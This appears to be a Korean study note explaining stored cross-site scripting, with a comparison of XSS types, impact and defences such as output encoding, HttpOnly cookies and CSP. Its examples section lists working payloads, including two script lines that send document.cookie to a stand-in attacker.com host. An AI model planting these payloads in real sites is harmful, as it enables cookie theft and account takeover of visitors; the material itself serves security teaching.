# XSS (Stored)

## 개요
- XSS(Cross-Site Scripting)는 공격자가 악성 스크립트를  
  웹 페이지에 삽입하여 다른 사용자의 브라우저에서 실행되게 만드는 취약점입니다.
- Stored XSS는 악성 스크립트가 서버 DB에 **영구 저장**되어, 해당 페이지를 방문하는 모든 사용자에게 자동으로 실행됩니다.
- 주로 게시판, 댓글, 방명록 등 사용자 입력이 저장되는 곳에서 발생합니다.

---

## XSS 유형 비교
| 구분 | 설명 | 특징 |
|------|------|------|
| Reflected XSS | URL을 통해 입력값이 즉시 반사 | 링크 클릭 시 실행, 서버에 저장되지 않음 |
| Stored XSS | 입력값이 DB에 저장된 후 출력 시 실행 | 페이지 접속만으로 실행, 지속적 피해 |
| DOM-based XSS | DOM 조작을 통해 클라이언트에서 실행 | 서버를 거치지 않고 브라우저 내에서 실행 |

---

## 핵심 개념
- 사용자 입력값이 검증 없이 DB에 저장되고, 이후 HTML에 그대로 출력될 때 발생합니다.
- Reflected XSS와 달리 피해자가 악성 링크를 클릭할 필요가 없습니다.
- 스크립트가 DB에 남아있는 한 페이지를 방문하는 모든 사용자가 피해 대상이 됩니다.

---

## 공격 방식 설명
- 공격자는 입력 필드에 `<script>`, `<img>`, `<svg>` 등의 HTML 태그를 이용해 스크립트를 삽입합니다.
- 서버가 입력값을 검증하지 않으면 스크립트가 DB에 저장됩니다.
- 이후 피해자가 해당 페이지를 열면 브라우저가 저장된 스크립트를 실행합니다.

---

## 예시
- 정상 입력  
  → 안녕하세요, 좋은 글이네요!  
  → 감사합니다 :)

- 공격 입력  
  → `<script>alert('XSS')</script>`  
  → `<script>new Image().src='http://attacker.com/?c='+document.cookie</script>`  
  → `<img src=x onerror="alert('XSS')">`  
  → `<svg onload="alert('XSS')">`

- 웹 입력 예시  
  → 게시판 댓글 입력창에  
  `<script>document.location='http://attacker.com/?c='+document.cookie</script>` 입력  
  → 이후 해당 게시글을 방문하는 모든 사용자의 쿠키가 공격자 서버로 전송됨  

---

## 특징
- 스크립트가 DB에 저장되므로 공격이 지속적으로 유지됩니다.
- 피해자는 특별한 행동 없이 페이지 방문만으로 공격을 당합니다.
- 쿠키 탈취를 통한 세션 하이재킹, 계정 탈취가 가능합니다.
- 관리자가 해당 페이지를 방문하면 관리자 계정까지 탈취될 수 있습니다.
- 피싱 페이지 표시, 악성코드 배포 등으로 피해가 확산될 수 있습니다.

---

## 대응 방안
- 사용자 입력값에 대한 검증 및 필터링을 수행합니다.
- `htmlspecialchars()` 등을 사용하여 특수문자를 HTML 엔티티로 변환합니다.
- 데이터 출력 시 컨텍스트에 맞는 인코딩을 적용합니다.
- HttpOnly 쿠키를 설정하여 JavaScript에서 쿠키 접근을 차단합니다.
- CSP(Content Security Policy) 헤더를 설정하여 허용된 스크립트만 실행되도록 합니다.
- WAF를 적용하여 XSS 패턴을 탐지 및 차단합니다.

---

## 정리
- Stored XSS는 악성 스크립트가 DB에 저장되어 불특정 다수를 자동으로 공격하는 취약점입니다.
- 쿠키 탈취, 세션 하이재킹, 계정 탈취 등 피해 범위가 매우 넓습니다.
- 입력값 검증, 출력 인코딩, HttpOnly 쿠키 설정이 핵심 대응 방법입니다.
